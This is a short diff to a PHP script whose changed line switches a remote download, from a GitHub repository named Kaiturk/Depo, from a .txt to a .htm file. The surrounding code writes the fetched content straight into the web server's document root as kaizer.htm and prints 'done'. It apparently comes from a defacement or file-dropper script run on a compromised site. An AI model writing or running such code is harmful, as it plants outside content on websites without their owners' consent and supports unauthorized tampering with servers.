@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/kaizer.htm" ;
-$text2 = http_get('https://raw.githubusercontent.com/Kaiturk/Depo/main/kaizer.txt');
+$text2 = http_get('https://raw.githubusercontent.com/Kaiturk/Depo/main/kaizer.htm');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
